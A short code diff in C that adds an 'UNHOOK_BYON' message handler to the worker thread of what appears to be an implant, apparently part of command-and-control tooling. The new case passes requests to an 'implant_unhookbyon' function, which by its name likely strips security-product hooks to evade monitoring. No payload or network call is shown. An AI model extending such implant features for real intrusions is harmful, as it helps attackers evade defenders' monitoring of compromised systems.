@@ -58,6 +58,14 @@ DWORD WINAPI wrkr_thread(struct new_thread_params_t* params) {
         implant_unhookl(&trans, unhookl_req);
         break;
     }
+    case UNHOOK_BYON: {
+        struct unhookbyon_msg_t* unhook_byon_msg = 
+            &msg.unhookbyon;
+        struct unhookbyon_req_t* unhook_byon_req = 
+            &unhook_byon_msg->req;
+        implant_unhookbyon(&trans, unhook_byon_req);
+        break;
+    }
     default:
         break;
     }
